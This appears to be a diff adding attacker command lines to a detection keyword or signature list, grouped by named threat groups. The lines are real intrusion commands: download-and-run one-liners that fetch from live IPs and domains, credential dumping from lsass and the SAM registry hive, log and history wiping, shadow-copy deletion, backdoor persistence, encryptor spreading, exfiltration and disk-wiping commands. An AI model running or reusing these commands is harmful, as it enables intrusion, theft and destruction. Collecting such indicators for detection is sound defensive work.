@@ -31,3 +31,491 @@ Powersploit
 Invoke-Mimikatz
 
 # Don't remove this line
+# PAExec
+-sname
+
+# Dirty Wolf
+ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\programdata\activedirectory' q q
+AppData\Roaming\Telegram Desktop\tdata
+
+# Gremlin Wolf
+cmd.exe /c start \\expo-forum.net\DavWWWRoot\expo-forum\Akt_sdachi_priemki_PMFG_2024.pdf
+\\expo-forum.net\DavWWWRoot\node.exe \\expo-forum.net\DavWWWRoot\image
+node.exe \\
+cmd.exe /c C:\Windows\Temp\procdump.exe -accepteula -r -ma
+C:\Windows\Temp
+rundll32 C:\Windows\system32\comsvcs.dll,MiniDump
+wmic path win32_networkadapter where "NetEnabled='TRUE'" call disable
+product get name
+AntiVirusProduct
+computersystem get domain
+computersystem get name
+os get installdate
+product list brief
+process call create
+shadowcopy delete
+EventFilter
+FilterToConsumerBinding
+CommandLineEventConsumer
+ActiveScriptEventConsumer
+
+# Ngrok
+tcp 3389
+
+# Shadow Wolf
+ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\Users\Public\Temp\log' q q
+powershell.exe -ex bypass -f Get-RDPLogs.ps1 -ComputerName
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"
+attrib -s -h %userprofile%\documents\Default.rdp
+del %userprofile%\documents\Default.rdp
+del /f /s /q /a %AppData%\Microsoft\Windows\Recent\AutomaticDestinations 
+
+# ADRecon
+-GenExcel
+-OutputDir
+-Collect
+-OutputType
+
+# Rclone
+copy
+--max-age
+--exclude
+--ignore-existing
+--auto-confirm
+--multi-thread-streams
+--transfers
+
+# Enigma Wolf
+for /f "delims=" %%i in (host.txt) do ( start psexec.exe -accepteula \\%%i -f -s -c "rdpe.bat" )
+for /f "delims=" %%i in (host.txt) do ( start psexec.exe -accepteula \\%%i -s C:\tmp\mesh.exe -fullinstall ping 127.0.0.1 -n 1 )
+
+# MeshCentral
+-fullinstall
+
+# DiskCryptor
+start "C:\'Program Files'\dcrypt\dccon.exe" -encrypt Z:\ -p
+for /f "delims=" %%i (host.txt) do ( start psexec.exe -accepteula \\%%i -s shutdown -r -f -t 30 ping 127.0.0.1 -n 1 )
+
+# Money Libra
+/bin/bash -c apt-get update && apt-get install -y wget cron; service cron start; wget -q -O - http://78.153.140.96/mi.sh | sh; tail -f /dev/null
+chattr -i /etc/ld.so.preload
+rm -f /etc/ld.so.preload
+pkill -f supportxml
+pkill -f monero
+pkill -f kthreaddi
+pkill -f srv00
+pkill -f /tmp/.javae/javae
+pkill -f .javae
+pkill -f .syna
+pkill -f .main
+pkill -f xmm
+
+ufw disable
+iptables -F
+
+history -c
+rm -rf .bash_history
+cat .bash_history
+
+.ssh
+id_rsa
+id_dsa
+id_ecdsa
+id_ecdsa-sk
+id_ed25519
+id_ed25519-sk
+id_rsa
+known_hosts
+
+ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host -p$sshp
+sudo curl -L http://194.38.20.199/spr.sh
+sudo wget -q -O - http://194.38.20.199/spr.sh
+
+sh -c '[ -f "/bin/bash" ] && (curl -s http://78.153.140.96/ph.sh||wget -q -O- http://78.153.140.96/ph.sh)|bash || (curl -s http://78.153.140.96/ph2.sh||wget -q -O- http://78.153.140.96/ph2.sh)|sh'
+
+# Hive0117
+wscript.exe "%AppData%\Local
+wscript.exe "%AppData\Roaming
+cscript.exe "%AppData%\Local
+cscript.exe "%AppData%\Roaming
+
+regsrv32.exe /i /s "C:\Users
+
+vssadmin.exe Delete Shadows /All /Quiet
+pwsh.exe -NonI -W Hidden -Exec Bypass
+Add-MpPreference -ExclusionPath %LOCALAPPDATA%
+powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc
+
+# Albino Ghouls
+SELECT * FROM Win32_ComputerSystem
+SELECT * FROM Win32_Processor
+SELECT UUID FROM Win32_ComputerSystemProduct
+SELECT * FROM AntiVirusProduct
+SELECT * FROM Win32_BIOS
+
+cmd.exe /c
+cmd.exe /u /c "dir /-c /4 /a "C:\" >
+cmd.exe /u /c "wmic logicaldisk get deviceid,volumename,caption,description,size >
+
+schtasks.exe /create /tn 'Flash Player Update' /sc HOURLY /tr "wscript 
+
+7z.exe a -t7z -r0 -mmt2 -ms=off -y "
+nircmd.exe "savescreenshotfull" 
+elevatecmd
+execmd
+killprocess
+memdump
+runas
+runassystem
+savescreenshotfull
+
+# Stone Wolf
+"c:\st\Autoit3.exe" c:\st\script.a3x
+forfiles.exe /p C:\Windows\System32 /m cmmon32.exe /c powershell . \*i*\*2\msh*e https://sportsboulevard-shop.com/nico/Scan_RusAutomation_TZ_298_21.08.2024
+
+# Bloody Wolf
+schtasks /create /sc minute /mo 30 /tn Skype /tr C:\Users\
+\AppData\Roaming\AdiletGovKZ.jar
+exe /c shutdown /r /t 0
+exe /c shutdown /s /t 0
+exe -jar 
+exe /c 
+exe /c wmic /node:. /namespace:'//root/cimv2' path win32_process get name,processed,commandline /format:list
+exe /c wmic /node:. /namespace:'//root/cimv2' path win32_startupcommand get name,location, /format:list
+
+chrome.exe -new-window data:text/html,<title>Strigoi Browser</title> -mute-audio -disable-audio -window-position=
+firefox.exe -new-window data:text/html,<title>Strigoi Browser</title>
+
+exe /c net user 
+exe /c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v "dontdisplaylastusername" /t REG_DWORD /d 1 /f
+
+cmd.exe /c net user
+cmd.exe /c wmic /node:. /namespace:'\\\\root\cimv2' path win32_userprofile where "LocalPath='
+cmd.exe /c reg add HKLM\Software\Microsoft\CurrentVersion\Policies\System /v "dontdisplaylastusername" /t REG_DWORD /d 0 /f
+
+%ProgramData%\WindowsDefender\Update\SecuritySystrayw.exe %ProgramData%\WindowsDefender\Update\v.3 -ip %ProgramData%\WindowsDefender\Update\sys -c %ProgramData%\WindowsDefende\Update\loc -A
+
+# Shedding Zmiy
+revsocks
+connect
+pass
+socks
+tls
+ws
+proxy
+proxyauth
+useragent
+
+# Awaken Likho
+RunProgram="hidcon:cmd /c  copy /y \"%CD%\*.*\" \"%CD%\..\\\""
+RunProgram="hidcon:cmd /c  cd %TEMP% & copy 1043685322228623 1043685322228623.cmd"
+RunProgram="hidcon:cmd /c  cd %TEMP & 1043685322228623.cmd"
+
+-autoreconnect
+-id
+-connect
+
+# IAmTheKing
+cmd.exe /v:on /c findstr "::::::::::::.*" "резюме.lnk" > "%tmp%\honor.vbs" & cscript.exe "%tmp\honor.vbs" & del "%tmp%\honor.vbs"
+Shell32.DLL,ShellExec_RunDLL %comspec% /c set p1=-e&&set p2=Xe&&set p3=C B&&set p4=Y&&set p5=Pa&&set p6=sS&&%comspec% /c echo sal a New-Object;$wa=a`Ne`T.`Web`Cli`ent;
+$wa.DownloadFile('htt'+'p://w'+'eb.ara'+'bleaguen'+'ews.com:4'+'43/?s=4263'+'35925316043a*r=Q'+'25tRZjvj'+' QY3mRJaUU9iHzkTUD6dFKtQUIXI=',%temp%\jlnli.ps1");%temp%\jlnli.ps1 ^| powershell %p1%%p2%%p3%%p4%%p5%%p6% -w 1 -file -
+
+# GOFFEE
+DigitalRSASignature
+CHECKSUM
+%USERPROFILE%\UserCache.ini
+%USERPROFILE%\UserCache.ini.hta
+HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows
+HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\LOAD
+
+AZURE_RESOURCE_GROUP=
+ONEDRIVE_RESOURCE_GROUP=
+VB=
+AZURE_DECODE=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($env:AZURE_RESOURCE_GROUP+$env:ONEDRIVE_RESOURCE_GROUP))
+
+HKCU\Environment
+
+mastc.exe client --tls-skip-verify -v https://
+mshta.exe https://beltifay.com/implugnable/orthodox/nurses/intuitively/annexed.hta
+
+cmd.exe /c echo (new ActiveXObject(«Shell.Application»)).ShellExecute("%POWERSHELL_PATH%","-c $Content= Get-Content $env:USERPROFILE\\user.txt; Invoke-Expression $Content", "", "open", "0") > {user_path}\desktop.js
+cmd.exe /c echo $wuri = new-object system.UriBuilder('ab://' + '{url_to_powershell_script}'); $wuri.Scheme = 'https'; Invoke-Expression $(New-Object new.webclient).UploadString($wuri.Uri, '') > {user_path}\user.txt
+
+cmd.exe /c 'shutdown /r /f /t 5 && reg delete HKEY_LOCAL_MACHINE\SYSTEM /f && reg delete HKEY_LOCAL_MACHINE\SOFTWARE /f'
+
+# Team46
+powershell.exe -w Minimized -ep Bypass -nop -c "irm https://infosecteam.info/other.php?id=jdcz7vyqdoadr31gejeivo6g30cx7kgu | iex"
+irm
+iex
+Invoke-RestMethod
+Invoke-WebRequest
+iwr
+Invoke-Expression
+
+powershell.exe -w Minimized -ep Bypass -nop -c "iwr 'http://infosecteam[.]info/Job%20application.pdf' -OutFile $env:LOCALAPPDATA\Temp\102fa066-cc9d-4a80-b3aa-12d5df196b42.pdf -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.';$env:LOCALAPPDATA\Temp\102fa066-cc9d-4a80-b3aa-12d5df196b42.pdf; iwr 'http://infosecteam.info/base.php' -OutFile $env:LOCALAPPDATA\Yandex\YandexBrowser\Application\Wldp.dll -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.';
+C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -w Minimized -ep Bypass -nop -c "iwr 'https://srv480138.hstgr.cloud/uploads/scan_3824.pdf' -OutFile $env:LOCALAPPDATA\Temp\399ha122-tt9d-6f14-s9li-lqw7di42c792.pdf -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.';$env:LOCALAPPDATA\Temp\399ha122-tt9d6f14-s9li-lqw7di42c792.pdf;iwr 'https://srv480138.hstgr.cloud/report.php?query=$env:COMPUTERNAME' -OutFile $env:LOCALAPPDATA\Temp\AdobeUpdater.exe -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.1 YaBrowser/23.11.0.0 Safari/537.36';$env:LOCALAPPDATA\Temp\AdobeUpdater.exe;"
+
+# Rare Werewolf
+curl.exe -o C:\Intel\driver.exe hostingforme.nl/down/driver.exe
+curl.exe -o C:\Intel\pas.rar hostingforme.nl/down/pas.rar
+curl.exe -o C:\Intel\keys.rar hostingforme.nl/down/keys.rar
+curl.exe -o C:\Intel\MPK.rar hostingforme.nl/down/MPK.rar
+curl.exe -o C:\Intel\AnyDesk.exe hostingforme.nl/down/AnyDesk.exe
+curl.exe -o C:\Intel\Trays.rar http://hostingforme.nl/down/Trays.rar
+
+blat.exe -to %mail-in% -f "TELEGRAM<%mail-out%>" -server %smtp% -port 587 -u %mail-out% -pw %pass-out% -subject "Telegram %ComputerName%" -body "Telegram %ComputerName%" -attach "C:\Intel\tdata.rar"
+
+-server
+-u
+-pw
+-subject
+-body
+-attach
+
+rezet.cmd AnyDesk.exe --install C:\Intel\AnyDesk
+
+# XDSpy
+%WINDOWS%\System32\forfiles.exe /P %WINDOWS%\System32 /M write.exe /C "%PROGRAMDATA%\Microsoft\DeviceSync\uvxkhvso"
+
+"C:\Windows\sysnative\cmd.exe" /c cd /d "C:\Program Files (x86)\ConsulSoft\StatRKZU\Export" && expand -F:* install.cab "C:\Program Files (x86)\ConsulSoft\StatRKZU\Export" && ren wiasvc64.dll wiasvc.dll && wiasvc.bat
+"C:\Windows\sysnative\cmd.exe" /c cd /d "C:\Program Files\ConsulSoft\StatRKZU\Export" && expand -F:* install.cab "C:\Program Files (x86)\ConsulSoft\StatRKZU\Export" && ren wiasvc32.dll wiasvc.dll && wiasvc.bat
+
+Windows Image Acquisition Service
+
+systeminfo
+tasklist
+fsutil
+fsinfo
+hostname
+
+# Angry Likho
+\\document-cdn.org\Microsoft Office Word$\WINWORD.exe
+cmd.exe /c start "" reg.exe add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Microsoft Office Word" /t REG_SZ /d "\\94.156.8.166\Microsoft Office Word$\WINWORD.exe" /f & start "" msg * Произошла ошибка при открытии данного документа. Файл повреждене и не может быть восстановлен & start "" xcopy "\\79.132.128.47\image.jpg" "\" /Y
+
+cmd.exe" /v /c set "k=%cd%\19_09_2024.msc"&(IF NOT EXIST "!k!" (for /f "tokens=* usebackq" %g in (`where /R "%userprofile" "19_09_2024.ms"?`) do set "k=%g")>nul 2>&1)&set "f=r"&set "o=%localappdata%"&>nul ce!f!tutil -decode """!k!""" !o!\cleu.t&ren "!o!\cleu.t" cleu.cmD&!o!\cleu
+certutil -decode """
+""" %LOCALAPPDATA%\cleu.t
+powershell -executionpolicy remotesigned -windowstyle hidden -Command "Invoke-Expression $([System.IO.File]::ReadAllText('%LOCALAPPDATA%\cleu.cmD'))"
+HKCU\Software\Microsoft\Office\$xlVersion\Excel\Security\AccessVBOM
+
+# Head Mare
+cmd /c echo %USERDOMAIN%
+
+powershell -c "Expand-Archive -Path $(Get-ChildItem -Path %userprofile% -Recurse -Filter "PC397.zip" | Select-Object -First 1).FullName -DestinationPath C:\ProgramData"; cmd.exe /c start /B 'C:\ProgramData\PC397.zip';!%SystemRoot%
+pcaula.exe -a C:\Windows\System32\splhost.exe
+
+-connect
+-clientIP
+-agentpassword
+-proxy
+-proxyauth
+-useragent
+
+ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q
+
+$ipFilePath = "C:\ProgramData\hosts.txt"
+$ipAddresses = Get-Content -Path $ipFilePath
+$sourcePath = "C:\ProgramData\lock.exe"
+$resultFilePath = "C:\ProgramData\Result.txt"
+$errorFilePath = "C:\ProgramData\Error.txt"
+foreach ($ipAddress in $ipAddresses) {
+    $destinationPath = "\\$ipAddress\C$\ProgramData"
+    try {
+        Copy-Item -Path $sourcePath -Destination $destinationPath -Force
+        "$sourcePath copy to $destinationPath" | Out-File -Append -FilePath $resultFilePath
+        Write-Host "$ipAddress--> Encryptor uploaded successfully" -ForegroundColor Green 
+    }
+    catch {
+        "$ipAddress" | Out-File -Append -FilePath $errorFilePath
+        Write-Host "$ipAddress --> Host is down" -ForegroundColor Red 
+    }
+}
+Write-Host "Done!"
+
+# Phoenix Hyena
+['SHELL=/bin/bash', 'HISTFILE=/dev/null']
+
+curl -fsSL https://gsocket.io/x
+curl -fsSL --connect-timeout 7 -m900 --retry 3 https://cdn.gsocket.io/bin/gs-netcat_mini-linux-x86_64 --output /dev/shm/.gs-0/gs-netcat_mini-linux-x86_64
+mv /dev/shm/.gs-0/gs-netcat_mini-linux-x86_64 /dev/shm/.gs-0/gs-netcat
+chmod 700 /usr/bin/defunct
+cp /dev/shm/.gs-0/gs-netcat /usr/bin/defunct
+rm -f /dev/shm/.gs-0/gs-netcat
+touch /lib/systemd/system/defunct.service
+chmod 644 /lib/systemd/system/defunct.service
+touch /lib/systemd/system/defunct.dat
+rm -rf /dev/shm/.gs-0/*
+rmdir /dev/shm/.gs-0
+systemctl enable defunct
+
+[Unit]
+Description=D-Bus System Connection Bus
+After=network.target
+[Service]
+Type=simple
+Restart=always
+RestartSec=10
+WorkingDirectory=/root
+ExecStart=/bin/bash -c "GS_ARGS='-k 
+/gs-dbus.dat -ilq' exec -a '
+
+/usr/bin/pkill -0 -U105 gs-dbus 2>/dev/null || SHELL=/bin/bash TERM=xterm-256color GS_ARGS="-k 
+/gs-dbus.dat -liqD" /bin/bash -c "exec -a '
+/gs-dbus'" 2>/dev/null
+
+wevutil.exe cl Security
+
+# KibOrg
+--set-password
+
+# Twelve
+powershell.exe -ex bypass -f C:\Users\Public\gpo.ps1
+powershell -command wevutil el | Foreach-Object {Write-Host Clearing $_; wevutil cl $_}
+
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"
+
+# UHG
+unset HISTFILE; unset SSH_CONNECTION; unset SSH_CLIENT ; unset LC_TERMINAL; unset LC_TERMINAL_VERSION
+history -c
+
+touch -t 202006231433.23 Data.php
+
+bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"
+curl -fsSL --connect-timeout 7 -m30 --retry 3 https://gsocket.io/bin/gs-netcat_x86-64-alpine.tar.gz --output /dev/shm/.gs-0/gs-netcat_x86-64-alpine.tar.gz
+tar xfz gs-netcat_x86-64-alpine.tar.gz
+cp /dev/shm/.gs-0/gs-netcat /usr/bin/gs-netcat
+
+snap advise-snap --format=json --command mysqldump
+nmap -p 22
+nmap -p 3306
+wget https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php -O Data.php
+adminer
+
+# BO Team
+system reset-configuration
+reset saved-configuration
+schedule reboot delay 60
+dd bs=1M if=/dev/zero of=/dev/mmcblk0
+sleep 600 && rm -rf /* &
+
+# IT Army of Ukraine
+pro.exe -accepteula -ma lsass.exe lsass.dmp
+psexec64.exe -i
+
+@echo off
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"
+attrib -s -h %userprofile%\documents\Default.rdp
+del %userprofile%\documents\Default.rdp
+del /f /s /q /a %AppData%\Microsoft\Windows\Recent\AutomaticDestinations
+
+# GhostEmperor
+cmd.exe /c certutil -urlcache -split -f http://8.210.141.104:8099/MEUpdate.exe C:\Windows\Help\Help\MEUpdate.exe
+sc.exe create "server power" binpath="C:\Windows\system32\cmd.exe /c start C:\Windows\Help\help\MEUpdate.exe"
+sc.exe start "server power"
+
+quser.exe whoami
+quser.exe quser
+net.exe time /do
+tasklist.exe /svc
+cmd.exe" /c netstat -ano"
+ipconfig.exe /all
+cmd.exe /C systeminfo
+cmd.exe /C net view \\
+cmd.exe /c dir $appdata
+cmd.exe /C dir "$programfiles\Kaspersky Lab\Kaspersky Endpoint Security for Windows\version.txt"
+cmd.exe /C type "$programfiles\Kaspersky Lab\Kaspersky Endpoint Security for Windows\version.txt"
+cmd.exe /C net group "domain admins" /
+cmd.exe /C net group /do
+ping.exe -n 1 -a 10.1.2.98
+cmd.exe /C type \\
+\SYSVOL
+\Policies\{C9289F9A-2A89-
+}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
+cmd.exe /C type \\
+\sysvol\run.bat
+
+$windir\Help\Help\DumpMinitool.exe --file 1.txt --processId 
+--dumpType Full
+cmd.exe /C DumpMinitool.exe --file 1.txt --processId 
+
+$windir\Help\Help\ssp.exe $windir\Help\Help\DII7.dll
+$windir\help\help\duplicatedump.exe -f test -c $windir\Help\Help\LSAPlugin.dll
+$windir\Help\Help\new.exe C:\Windows\help\help\dll7.dll
+
+cmd.exe /C findstr /s /i "cpassword" \\
+\sysvol\*.xml
+cmd.exe /c bitsadmin /transfer n http://8.210.141.104:8099/1.txt $public\Downloads\1.txt
+cmd.exe /c PowerShell iwr -Uri http://8.210.141.104:8099/1.txt -OutFile c:\1.txt -UseBasicParsing
+$windir\Help\Help\7z.exe a $windir\Help\Help\tg.7z $windir\Help\Help\1.rar
+curl.exe -F "file=@$windir\help\help\1.rar" --ssl-no-revoke https://file.io
+
+# China Chopper
+cmd /c cd "C:\inetpub\wwwroot\aspnet_client"&whoami&echo
+$hklm\system\controlset001\services\hixnjvod
+C:\Windows\system32\cmd.exe /b /c start /b /min PowerShell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b=$env:windir+'\sysnative\WindowsPowerShell\v1.0\PowerShell.exe'}else{$b='PowerShell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String("
+')))).[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';
+$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;
+$s=WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"
+
+$system32\cmd.exe /c certutil.exe -urlcache -split -f http://116.206.92.26:82/update.exe && update.exe && certutil.exe -urlcache -split -f http://116.206.92.26:82/update.exe delete
+
+instance of __EventFilter {
+    EventNamespace = "root\\cimv2";
+    Name = "Chrome Update";
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >=240 AND TargetInstance.SystemUpTime < 325";
+    QueryLanguage = "WQL"; };
+
+instance of CommandLineEventConsumer {
+    ExecutablePath = "C:\\Windows\\System32\\GoogleUpdate.exe";
+    Name = "GoogleUpdate";
+};
+
+PowerShell "Start-BitsTransfer -Source http://security.lomiasecure.net/crx/node.txt -Destination C:\\Users\\public\\node.txt -transfertype download"
+PowerShell if($InputString = Get-Content 'C:\\users\\public\\node.txt'){
+[System.IO.File]::WriteAllBytes('C:\\users\\public\\node.exe',
+[System.Convert]::FromBase64String($InputString))}
+
+attrib +s crml.exe
+schtasks /Create /Tn \Microsoft\Windows\Registration\CRMLog /sc daily /st 11:50 /tr "C:\Windows\Registration\crml.exe" /ru system /f
+schtasks /run /Tn \Microsoft\Windows\Registration\CRMLog
+
+$system32\cmd.exe /c bitsadmin /transfer n https://raw.githubusercontent.com/tellyou123/1/master/aro.dat $temp\aro.dat > C:\inetpub\wwwroot\aspnet_client\1.txt
+
+cmd.exe /C arp -a >
+$temp\gGjrlFGa.tmp 2>&1
+netstat.exe user
+ping.exe 8.8.8.8
+ping.exe google.com
+ping.exe 167.179.64.62
+
+cmd.exe /C xcopy /s $user\desktop c:\$recycle\bin\temp\
+cmd.exe /C xcopy /s $user\downloads c:\$recycle\bin\temp\
+cmd.exe /C $programdata\winrar\rar.exe a -r -hp1234 C:$recycle.bin\10020111desk.rar $user\desktop\*.txt $user\desktop\*.xls* $user\desktop\*.pdf $user\desktop\*.doc* $user\desktop\*.jpg > $temp\lwefqERM.tmp 2>&1
+C:\Windows\System32\reg.exe save hklm\sam sam.hive
+errorreport.exe -ma lsass.exe l.dmp
+net use \\
+/u:
+
+cmd /c mkdir C:\Windows\temp\debugsms
+cmd /c reg save hklm\sam C:\Windows\temp\debugsms\sam
+cmd /c reg save hklm\system C:\Windows\temp\debugsms\system
+cmd /c reg save hklm\security C:\Windows\temp\debugsms\security
+cmd /c choice /t 1 /d y /n >nul
+cmd /c ipconfig /all > C:\Windows\temp\debugsms\ip.txt
+cmd /c arp -a > C:\Windows\temp\debugsms\arp.txt
+cmd /c dir /b /s C:\Windows\temp\debugsms\ > C:\Windows\temp\siineidvsms.log
+cmd /c makecab /f C:\Windows\temp ssineidvsms.log /d compressiontype=lzx /d compressionmemory=21 /d maxdisksize=10240000000 /d diskdirectorytemplate="C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth" /d cabinetnametemplate=iisstop.png
+cmd /c start C:\Windows\temp\TMP23876.bat
+cmd /c rmdir /s /q C:\Windows\temp\debugsms
+
+cmd /c C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.EXE -c "$ctnt=Get-Content $temp\Err_36d96944_6318.log;PowerShell -enc $ctnt;
+
+
+# Do not remove the line
+
